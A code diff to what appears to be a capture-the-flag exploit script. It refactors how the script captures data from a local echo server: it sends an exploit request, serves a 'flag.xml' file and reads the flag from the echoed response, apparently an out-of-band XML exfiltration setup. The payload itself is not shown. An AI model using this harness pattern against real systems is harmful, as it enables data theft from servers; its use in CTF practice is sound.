@@ -7,7 +7,6 @@ from tool.base import match_flag, process_with, get_local_ip, run_cmd
 from tool.http_repeater import repeater
 from tool.http_server import HttpEcho, HttpFile
 
-echo = ""
 
 def run(target: tuple[str, int]) -> tuple[bool, str, str]:
     ip = get_local_ip()
@@ -39,22 +38,18 @@ Host: {target[0]}:{target[1]}
 
 """
 
-    def on_body(body: bytes):
-        global echo
-        echo += body.decode()
-    with HttpEcho(on_body,http_echo_port):
+
+    with HttpEcho(http_echo_port) as echo:
         with HttpFile({"flag.xml": xml},http_file_port):
             resp = repeater(exp1,timeout=2)
             if not resp and "Timeout" not in resp.error:
                 return False,"",resp.error
             run_cmd("sleep 0.5")
-            flag = match_flag(echo)
+            flag = match_flag(echo.echo())
             if not flag:
-                print(echo)
+                print(echo.echo())
                 return False,"","flag匹配失败"
             return True,flag,""
-
-
 
 
 
